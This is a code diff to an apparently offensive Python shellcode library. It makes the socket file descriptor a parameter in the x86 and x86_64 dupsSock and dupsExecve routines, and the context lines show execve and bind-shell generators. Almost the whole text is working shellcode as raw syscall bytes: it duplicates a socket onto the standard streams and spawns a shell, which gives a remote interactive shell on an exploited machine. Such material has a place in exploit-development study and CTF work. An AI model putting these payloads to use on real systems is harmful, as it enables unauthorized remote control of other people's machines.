@@ -80,8 +80,8 @@ class Shellcode(str):
 		return str.__str__(self)
  
 class x86:
-	def dupsSock(self):
-		dups = "\x31\xc9\x6a\x04\x5b\x6a\x3f\x58\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf4"
+	def dupsSock(self,fd=4):
+		dups = "\x31\xc9\x6a" + pack('<B',fd) + "\x5b\x6a\x3f\x58\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf4"
 		return Shellcode(dups)
 
 	def execveShell(self):
@@ -95,9 +95,9 @@ class x86:
 		execve+= "\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
 		return Shellcode(execve)
 
-	def dupsExecve(self):
+	def dupsExecve(self,fd=4):
 		# reuse socket fd and execve()
-		return self.dupsSock() + NOPs_X86*10 + self.execveShell()
+		return self.dupsSock(fd) + NOPs_X86*10 + self.execveShell()
 
 	def bindShell(self,port):
 		bindshell = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
@@ -131,8 +131,8 @@ class x86:
 		return Shellcode('\xeb' + chr(offset))
 
 class x86_64:
-	def dupsSock(self):
-		dups = "\x48\x31\xf6\x6a\x04\x5f\x6a\x21\x58\x0f\x05\x40\xfe\xc6\x40\x80\xfe\x03\x75\xf2"
+	def dupsSock(self,fd=4):
+		dups = "\x48\x31\xf6\x6a" + pack('<B',fd) + "\x5f\x6a\x21\x58\x0f\x05\x40\xfe\xc6\x40\x80\xfe\x03\x75\xf2"
 		return Shellcode(dups,1)
 
 	def execveShell(self):
@@ -148,8 +148,8 @@ class x86_64:
 		execve+= "\x54\x5f\x6a\x3b\x58\x0f\x05"
 		return Shellcode(execve,1)
 
-	def dupsExecve(self):
-		return self.dupsSock() + NOPs_X86*10 + self.execveSmallShell()
+	def dupsExecve(self,fd=4):
+		return self.dupsSock(fd) + NOPs_X86*10 + self.execveSmallShell()
 
 	def jmp(self,offset):
 		offset = offset & 0xff
